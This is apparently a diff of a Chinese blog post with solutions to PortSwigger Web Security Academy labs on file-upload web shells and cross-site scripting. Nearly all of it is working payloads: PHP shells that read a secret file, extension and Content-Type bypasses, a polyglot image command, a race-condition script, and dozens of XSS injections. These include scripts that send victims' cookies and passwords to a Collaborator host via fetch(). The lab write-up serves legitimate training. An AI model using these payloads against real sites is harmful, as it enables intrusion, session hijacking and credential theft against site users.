-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ &lt;?php </span><br><span class="line"> <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;/home/carlos/secret&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ &lt;?php <br> <span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&#x27;/home/carlos/secret&#x27;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure>
 <p>把这个文件在上传头像的地方上传，然后右键在新网页打开头像即可</p>
 <p>这个是github上找的方法比官方给的省事<br>可能因为网络问题用官方改数据包的方式可能失败</p>
 <h4 id="Web-shell-upload-via-Content-Type-restriction-bypass"><a href="#Web-shell-upload-via-Content-Type-restriction-bypass" class="headerlink" title="Web shell upload via Content-Type restriction bypass"></a>Web shell upload via Content-Type restriction bypass</h4><p>将Content-Type改为image/jpeg或png即可</p>
 <h3 id="practitioner-1"><a href="#practitioner-1" class="headerlink" title="practitioner"></a>practitioner</h3><h4 id="Web-shell-upload-via-path-traversal"><a href="#Web-shell-upload-via-path-traversal" class="headerlink" title="Web shell upload via path traversal"></a>Web shell upload via path traversal</h4><p>题目目标要求获得文件<code>/home/carlos/secret</code><br>将php一句话木马传入files文件夹以便解析<br>需要将文件名改为<code>..%2fexploit.php</code>绕过过滤<br>在新标签页查看即可</p>
 <h4 id="Web-shell-upload-via-extension-blacklist-bypass（没写出来）"><a href="#Web-shell-upload-via-extension-blacklist-bypass（没写出来）" class="headerlink" title="Web shell upload via extension blacklist bypass（没写出来）"></a>Web shell upload via extension blacklist bypass（没写出来）</h4><p>上传<code>.htaccess</code>文件绕过过滤<br>1.将<code>.htaccess</code>文件内容填写为:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .l33t</span><br></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">AddType <span class="hljs-built_in">application</span>/x-httpd-php .l33t<br></code></pre></td></tr></table></figure>
 <p>2.上传该文件，拦截更改Content-Type头为<code>text/plain</code><br>3.将一句话木马后缀改为<code>.133t</code>上传至<code>.htaccess</code>同文件夹<br>4.查看一句话木马文件即可（但我这没解析出来还是乱码）</p>
 <h4 id="Web-shell-upload-via-obfuscated-file-extension"><a href="#Web-shell-upload-via-obfuscated-file-extension" class="headerlink" title="Web shell upload via obfuscated file extension"></a>Web shell upload via obfuscated file extension</h4><p>文件名<code>%00</code>截断<br>将文件名设置为<code>1.php%00.jpg</code>类似即可</p>
 <h4 id="Remote-code-execution-via-polyglot-web-shell-upload（没写出来）"><a href="#Remote-code-execution-via-polyglot-web-shell-upload（没写出来）" class="headerlink" title="Remote code execution via polyglot web shell upload（没写出来）"></a>Remote code execution via polyglot web shell upload（没写出来）</h4><p>本题类似图片马<br>官方wp:<br>准备一张jpg图片<br>（windows命令行）运行<code>exiftool -Comment=&quot;&lt;?php echo &#39;START &#39; . file_get_contents(&#39;/home/carlos/secret&#39;) . &#39; END&#39;; ?&gt;&quot; (image_path)&lt;YOUR-INPUT-IMAGE&gt;.jpg -o polyglot.php</code><br>上传该文件后在新标签页打开（wp使用GET），解析其php代码<br>（尝试后打开还是乱码）</p>
 <h3 id="expert-1"><a href="#expert-1" class="headerlink" title="expert"></a>expert</h3><h4 id="Web-shell-upload-via-race-condition"><a href="#Web-shell-upload-via-race-condition" class="headerlink" title="Web shell upload via race condition"></a>Web shell upload via race condition</h4><p>点击Hint可以查看部分原码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file($_FILES[&quot;avatar&quot;][&quot;tmp_name&quot;], $target_file);</span><br><span class="line">if (checkViruses($target_file) &amp;&amp; checkFileType($target_file)) ···</span><br></pre></td></tr></table></figure>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">move<span class="hljs-constructor">_uploaded_file($<span class="hljs-params">_FILES</span>[<span class="hljs-string">&quot;avatar&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], $<span class="hljs-params">target_file</span>)</span>;<br><span class="hljs-keyword">if</span> (check<span class="hljs-constructor">Viruses($<span class="hljs-params">target_file</span>)</span><span class="hljs-operator"> &amp;&amp; </span>check<span class="hljs-constructor">FileType($<span class="hljs-params">target_file</span>)</span>) ···<br></code></pre></td></tr></table></figure>
 <p>存在逻辑漏洞可使用条件竞争<br>官方脚本配合攻击器使用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def queueRequests(target, wordlists):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)</span><br><span class="line"></span><br><span class="line">    request1 = &#x27;&#x27;&#x27;&lt;YOUR-POST-REQUEST&gt;&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    request2 = &#x27;&#x27;&#x27;&lt;YOUR-GET-REQUEST&gt;&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    # the &#x27;gate&#x27; argument blocks the final byte of each request until openGate is invoked</span><br><span class="line">    engine.queue(request1, gate=&#x27;race1&#x27;)</span><br><span class="line">    for x in range(5):</span><br><span class="line">        engine.queue(request2, gate=&#x27;race1&#x27;)</span><br><span class="line"></span><br><span class="line">    # wait until every &#x27;race1&#x27; tagged request is ready</span><br><span class="line">    # then send the final byte of each request</span><br><span class="line">    # (this method is non-blocking, just like queue)</span><br><span class="line">    engine.openGate(&#x27;race1&#x27;)</span><br><span class="line"></span><br><span class="line">    engine.complete(timeout=60)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def handleResponse(req, interesting):</span><br><span class="line">    table.add(req)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">queueRequests</span>(<span class="hljs-params">target, wordlists</span>):<br>    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=<span class="hljs-number">10</span>,)<br><br>    request1 = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;YOUR-POST-REQUEST&gt;&#x27;&#x27;&#x27;</span><br><br>    request2 = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;YOUR-GET-REQUEST&gt;&#x27;&#x27;&#x27;</span><br><br>    <span class="hljs-comment"># the &#x27;gate&#x27; argument blocks the final byte of each request until openGate is invoked</span><br>    engine.queue(request1, gate=<span class="hljs-string">&#x27;race1&#x27;</span>)<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        engine.queue(request2, gate=<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br>    <span class="hljs-comment"># wait until every &#x27;race1&#x27; tagged request is ready</span><br>    <span class="hljs-comment"># then send the final byte of each request</span><br>    <span class="hljs-comment"># (this method is non-blocking, just like queue)</span><br>    engine.openGate(<span class="hljs-string">&#x27;race1&#x27;</span>)<br><br>    engine.complete(timeout=<span class="hljs-number">60</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handleResponse</span>(<span class="hljs-params">req, interesting</span>):<br>    table.add(req)<br></code></pre></td></tr></table></figure>
 
-<h2 id="Cross-site-scripting"><a href="#Cross-site-scripting" class="headerlink" title="Cross-site scripting"></a>Cross-site scripting</h2><h3 id="apprentice-2"><a href="#apprentice-2" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Reflected XSS into HTML context with nothing encoded"></a>Reflected XSS into HTML context with nothing encoded</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Cross-site-scripting"><a href="#Cross-site-scripting" class="headerlink" title="Cross-site scripting"></a>Cross-site scripting</h2><h3 id="apprentice-2"><a href="#apprentice-2" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="Reflected-XSS-into-HTML-context-with-nothing-encoded"><a href="#Reflected-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Reflected XSS into HTML context with nothing encoded"></a>Reflected XSS into HTML context with nothing encoded</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p>直接输入搜索框即可</p>
 <h4 id="Stored-XSS-into-HTML-context-with-nothing-encoded"><a href="#Stored-XSS-into-HTML-context-with-nothing-encoded" class="headerlink" title="Stored XSS into HTML context with nothing encoded"></a>Stored XSS into HTML context with nothing encoded</h4><p>随便点开一个帖子，把alert添加到评论里即可</p>
 <h4 id="DOM-XSS-in-document-write-sink-using-source-location-search"><a href="#DOM-XSS-in-document-write-sink-using-source-location-search" class="headerlink" title="DOM XSS in document.write sink using source location.search"></a>DOM XSS in document.write sink using source location.search</h4><p>检测为双引号闭合</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
 <p>搜索框输入</p>
-<h4 id="DOM-XSS-in-innerHTML-sink-using-source-location-search"><a href="#DOM-XSS-in-innerHTML-sink-using-source-location-search" class="headerlink" title="DOM XSS in innerHTML sink using source location.search"></a>DOM XSS in innerHTML sink using source location.search</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="DOM-XSS-in-innerHTML-sink-using-source-location-search"><a href="#DOM-XSS-in-innerHTML-sink-using-source-location-search" class="headerlink" title="DOM XSS in innerHTML sink using source location.search"></a>DOM XSS in innerHTML sink using source location.search</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
 <p>还是搜索框</p>
+<h4 id="DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="DOM XSS in jQuery anchor href attribute sink using location.search source"></a>DOM XSS in jQuery anchor href attribute sink using location.search source</h4><p>根据题目提示注入点在submit feedback page，查看源码，获得提示注入于<code>returnPath</code>处</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">returnPath</span>=javascript:alert(document.cookie)<br></code></pre></td></tr></table></figure>
+<h4 id="DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="DOM XSS in jQuery selector sink using a hashchange event"></a>DOM XSS in jQuery selector sink using a hashchange event</h4><p>查看源码的<code>&lt;script&gt;</code>部分，需要使用题目提供的exploit server<br>在exploit server的body部分改为<code>&lt;iframe src=&quot;https://.....web-security-academy.net/#&quot; onload=&quot;this.src+=&#39;&lt;img src=x onerror=print()&gt;&#39;&quot;&gt;&lt;/iframe&gt;</code>（应该就是bot监听了），点击View exploit确认工作正常，点击Deliver to victim解决</p>
+<h4 id="Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-attribute-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into attribute with angle brackets HTML-encoded"></a>Reflected XSS into attribute with angle brackets HTML-encoded</h4><p>注入点在搜索框<br><code>&quot;onmouseover=&quot;alert(1)</code></p>
+<h4 id="Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded"><a href="#Stored-XSS-into-anchor-href-attribute-with-double-quotes-HTML-encoded" class="headerlink" title="Stored XSS into anchor href attribute with double quotes HTML-encoded"></a>Stored XSS into anchor href attribute with double quotes HTML-encoded</h4><p>进入随便一个博客评论区，注入点在网址添加那<br><code>javascript:alert(1)</code></p>
+<h4 id="Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded"><a href="#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-HTML-encoded" class="headerlink" title="Reflected XSS into a JavaScript string with angle brackets HTML encoded"></a>Reflected XSS into a JavaScript string with angle brackets HTML encoded</h4><p>注入点在搜索框<br><code>&#39;-alert(1)-&#39;</code>，对JavaScript破坏</p>
+<h3 id="practitioner-2"><a href="#practitioner-2" class="headerlink" title="practitioner"></a>practitioner</h3><h4 id="DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><a href="#DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element" class="headerlink" title="DOM XSS in document.write sink using source location.search inside a select element"></a>DOM XSS in document.write sink using source location.search inside a select element</h4><p>进入商品详情页面，选择查看源码，发现存在注入点storeId</p>
+<figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bnf">product?productId=1&amp;storeId=&quot;&gt;<span class="hljs-attribute">&lt;/select&gt;</span><span class="hljs-attribute">&lt;img%20src=1%20onerror=alert(1)&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="DOM-XSS-in-AngularJS-expression-with-angle-brackets-and-double-quotes-HTML-encoded"><a href="#DOM-XSS-in-AngularJS-expression-with-angle-brackets-and-double-quotes-HTML-encoded" class="headerlink" title="DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded"></a>DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded</h4><p>结合了模板注入，注入点在搜索框</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$on.constructor</span>(<span class="hljs-name">&#x27;alert(1)&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<h4 id="Reflected-DOM-XSS"><a href="#Reflected-DOM-XSS" class="headerlink" title="Reflected DOM XSS"></a>Reflected DOM XSS</h4><p>查看源码，注入点在搜索位，输入内容以JSON形式返回<br><code>\&quot;-alert(1)&#125;//</code></p>
+<h4 id="Stored-DOM-XSS"><a href="#Stored-DOM-XSS" class="headerlink" title="Stored DOM XSS"></a>Stored DOM XSS</h4><p>在评论区注入</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>最开始的<code>&lt;&gt;</code>受到replace()的影响，替换为<code>&amp;lt</code>和<code>&amp;gt</code></p>
+<h4 id="Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked"><a href="#Reflected-XSS-into-HTML-context-with-most-tags-and-attributes-blocked" class="headerlink" title="Reflected XSS into HTML context with most tags and attributes blocked"></a>Reflected XSS into HTML context with most tags and attributes blocked</h4><p>用burp不停发包检测被列入黑名单的关键字<br>在exploit server使用：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;iframe src=<span class="hljs-string">&quot;https://....web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E&quot;</span> onload=this.style.width=<span class="hljs-string">&#x27;100px&#x27;</span>&gt;<br></code></pre></td></tr></table></figure>
+<p>类似“DOM XSS in jQuery selector sink using a hashchange event”</p>
+<h4 id="Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones"><a href="#Reflected-XSS-into-HTML-context-with-all-tags-blocked-except-custom-ones" class="headerlink" title="Reflected XSS into HTML context with all tags blocked except custom ones"></a>Reflected XSS into HTML context with all tags blocked except custom ones</h4><p>要点在于tabindex标签</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;script&gt;</span><br><span class="hljs-attribute">location</span> = &#x27;https://....web-security-academy.net/?search=%<span class="hljs-number">3</span>Cxss+id%<span class="hljs-number">3</span>Dx+onfocus%<span class="hljs-number">3</span>Dalert%<span class="hljs-number">28</span>document.cookie%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>tabindex=<span class="hljs-number">1</span>%<span class="hljs-number">3</span>E#x&#x27;;<br><span class="hljs-section">&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+<p>谷歌上也有用<code>&lt;iframe&gt;</code>构造的</p>
+<h4 id="Reflected-XSS-with-some-SVG-markup-allowed"><a href="#Reflected-XSS-with-some-SVG-markup-allowed" class="headerlink" title="Reflected XSS with some SVG markup allowed"></a>Reflected XSS with some SVG markup allowed</h4><p>根据题目意思需要<code>&lt;svg&gt;</code>标签绕过<br>经过测试，<code>&lt;animatetransform&gt;</code>标签可通过且可使用js</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animatetransform</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">animatetransform</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="Reflected-XSS-in-canonical-link-tag"><a href="#Reflected-XSS-in-canonical-link-tag" class="headerlink" title="Reflected XSS in canonical link tag"></a>Reflected XSS in canonical link tag</h4><p>查看原代码</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;canonical&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&#x27;https://0add00a703ba409e80aaf851005400c9.web-security-academy.net/post?postId=3&#x27;</span>/&gt;<br></code></pre></td></tr></table></figure>
+<p>可以用单引号拼接：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?<span class="hljs-variable">%27</span>accesskey<span class="hljs-operator">=</span><span class="hljs-variable">%27</span><span class="hljs-keyword">x</span><span class="hljs-variable">%27</span>onclick<span class="hljs-operator">=</span><span class="hljs-variable">%27</span>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+<p>accesskey提供快捷键来激活脚本</p>
+<h4 id="Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped"><a href="#Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped" class="headerlink" title="Reflected XSS into a JavaScript string with single quote and backslash escaped"></a>Reflected XSS into a JavaScript string with single quote and backslash escaped</h4><p>注入点在搜索框</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> searchTerms = <span class="hljs-string">&#x27;1\&#x27;1&#x27;</span>;</span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(searchTerms)+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>会转义单引号，可选择闭合标签</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped"><a href="#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped" class="headerlink" title="Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped"></a>Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</h4><p>与上一题类似</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-keyword">var</span> searchTerms = <span class="hljs-string">&#x27;i\&#x27;i&#x27;</span>;</span><br><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+<span class="hljs-built_in">encodeURIComponent</span>(searchTerms)+<span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>也是转义单引号</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">\&#x27;-alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+<p>改为注释加入js一句话木马</p>
+<h4 id="Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped"><a href="#Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped" class="headerlink" title="Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped"></a>Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</h4><p>注入点在博客的评论区添加网页链接处<br>输入的内容会添加在<code>&lt;a&gt;</code>标签内</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://foo?<span class="hljs-symbol">&amp;apos;</span>-alert(1)-<span class="hljs-symbol">&amp;apos;</span><br></code></pre></td></tr></table></figure>
+<h4 id="Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped"><a href="#Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped" class="headerlink" title="Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped"></a>Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</h4><p>转义特殊字符，结合模板</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)&#125;<br></code></pre></td></tr></table></figure>
+<h4 id="Exploiting-cross-site-scripting-to-steal-cookies"><a href="#Exploiting-cross-site-scripting-to-steal-cookies" class="headerlink" title="Exploiting cross-site scripting to steal cookies"></a>Exploiting cross-site scripting to steal cookies</h4><p>这题需要用Burp Collaborator外带获得session值</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, &#123;</span><br><span class="language-javascript"><span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>,</span><br><span class="language-javascript"><span class="hljs-attr">body</span>:<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><br><span class="language-javascript">&#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><code>https://BURP-COLLABORATOR-SUBDOMAIN</code>在Collaborator内复制，将该脚本注入于博客评论区<br>查看Collaborator中有secret字段的返回包，复制swssion值<br>点击home并拦截修改session</p>
+<h4 id="Exploiting-cross-site-scripting-to-capture-passwords"><a href="#Exploiting-cross-site-scripting-to-capture-passwords" class="headerlink" title="Exploiting cross-site scripting to capture passwords"></a>Exploiting cross-site scripting to capture passwords</h4><p>与上类似，需要获得密码登录</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=username <span class="hljs-attribute">id</span>=username&gt;<br>&lt;input <span class="hljs-attribute">type</span>=password <span class="hljs-attribute">name</span>=password <span class="hljs-attribute">onchange</span>=<span class="hljs-string">&quot;if(this.value.length)fetch(&#x27;https://...&#x27;,&#123;</span><br><span class="hljs-string">method:&#x27;POST&#x27;,</span><br><span class="hljs-string">mode: &#x27;no-cors&#x27;,</span><br><span class="hljs-string">body:username.value+&#x27;:&#x27;+this.value</span><br><span class="hljs-string">&#125;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
+<h4 id="Exploiting-XSS-to-perform-CSRF"><a href="#Exploiting-XSS-to-perform-CSRF" class="headerlink" title="Exploiting XSS to perform CSRF"></a>Exploiting XSS to perform CSRF</h4><p>注入点在评论区，登录后选择更改邮箱，抓包发现有个CSRF token</p>
